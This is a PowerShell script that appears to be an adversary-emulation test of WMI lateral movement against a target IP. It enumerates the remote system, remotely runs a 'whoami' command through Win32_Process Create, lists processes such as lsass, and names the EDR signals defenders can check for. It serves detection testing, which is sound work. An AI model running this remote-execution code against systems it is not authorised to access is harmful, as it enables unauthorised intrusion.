param(
    [Parameter(Mandatory=$true)]
    [string]$TargetIP
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting Lateral Movement - WMI Execution..." -ForegroundColor Cyan

# T1047 - Windows Management Instrumentation
# Uses WMI to remotely execute commands without dropping binaries

Write-Host "[*] [T1047] WMI remote command execution" -ForegroundColor Yellow
Write-Host "[!] Target: $TargetIP" -ForegroundColor Yellow
Write-Host "[!] Uses native WMI - no external tools required" -ForegroundColor Yellow

# Step 1: Test WMI connectivity
Write-Host "`n[*] Testing WMI connectivity..."
Write-Host "    CMD: Test-WSMan -ComputerName $TargetIP"
$wmiTest = Test-WSMan -ComputerName $TargetIP -ErrorAction SilentlyContinue
if ($wmiTest) {
    Write-Host "[+] WMI/WinRM is accessible on $TargetIP" -ForegroundColor Green
} else {
    Write-Host "[!] WinRM may not be enabled, trying direct WMI..." -ForegroundColor Yellow
}

# Step 2: Enumerate remote system via WMI
Write-Host "`n[*] [T1047] Enumerating remote system via WMI..."

Write-Host "`n    CMD: Get-WmiObject Win32_ComputerSystem -ComputerName $TargetIP"
$sysInfo = Get-WmiObject Win32_ComputerSystem -ComputerName $TargetIP -ErrorAction SilentlyContinue
if ($sysInfo) {
    Write-Host "    [+] Hostname: $($sysInfo.Name)" -ForegroundColor Green
    Write-Host "    [+] Domain: $($sysInfo.Domain)" -ForegroundColor Green
}

Write-Host "`n    CMD: Get-WmiObject Win32_OperatingSystem -ComputerName $TargetIP"
$osInfo = Get-WmiObject Win32_OperatingSystem -ComputerName $TargetIP -ErrorAction SilentlyContinue
if ($osInfo) {
    Write-Host "    [+] OS: $($osInfo.Caption)" -ForegroundColor Green
}

# Step 3: Remote process execution via WMI
Write-Host "`n[*] [T1047] Executing remote process via WMI..."
$command = "cmd.exe /c whoami > C:\temp\wmi_output.txt"
Write-Host "    CMD: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '$command' -ComputerName $TargetIP"

$result = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command -ComputerName $TargetIP -ErrorAction SilentlyContinue
if ($result.ReturnValue -eq 0) {
    Write-Host "    [+] Process created successfully (PID: $($result.ProcessId))" -ForegroundColor Green
} else {
    Write-Host "    [-] Process creation failed (Return: $($result.ReturnValue))" -ForegroundColor Red
}

# Step 4: Remote process enumeration
Write-Host "`n[*] Enumerating remote processes..."
$procs = Get-WmiObject Win32_Process -ComputerName $TargetIP -ErrorAction SilentlyContinue | 
    Where-Object { $_.Name -match "lsass|winlogon|svchost" } | 
    Select-Object Name, ProcessId -First 5
$procs | ForEach-Object { Write-Host "    [+] $($_.Name) (PID: $($_.ProcessId))" -ForegroundColor Green }

# Step 5: WMI persistence (display)
Write-Host "`n[*] [T1546.003] WMI Event Subscription persistence command:" -ForegroundColor Cyan
Write-Host "    This technique creates a permanent WMI event to survive reboots"

Write-Host "`n[+] WMI Lateral Movement Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: WMI remote process creation, Win32_Process Create, wmiprvse.exe spawning cmd.exe" -ForegroundColor Yellow
